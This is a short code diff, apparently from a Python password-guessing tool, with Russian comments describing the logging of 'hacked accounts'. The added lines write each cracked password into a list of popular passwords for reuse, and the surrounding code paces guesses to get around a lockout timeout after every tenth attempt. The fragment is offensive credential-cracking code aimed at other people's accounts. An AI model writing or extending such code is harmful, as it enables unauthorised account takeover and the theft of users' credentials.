@@ -37,6 +37,10 @@ def start(password, team):
             with open(f"{CHECKING_PATH}/{team}.txt", "a", encoding="utf-8") as h_list: # сохраняем в файл взломанные акки
                 h_list.write(f"{get_ts()} {username}: {password} \n")
 
+            with open(f"{PASSWORDS_POPULAR_PATH}", "a",
+                      encoding="utf-8") as mb_list:  # сохраняем взломанный пароль в пароли типа МБ
+                mb_list.write(f"{password} \n")
+
         time.sleep(5)
         if k % 10 == 0:
             time.sleep(PASSWORDCHECK_TIMEOUT)  # ждем потому что таймаут после каждого 10 подбора
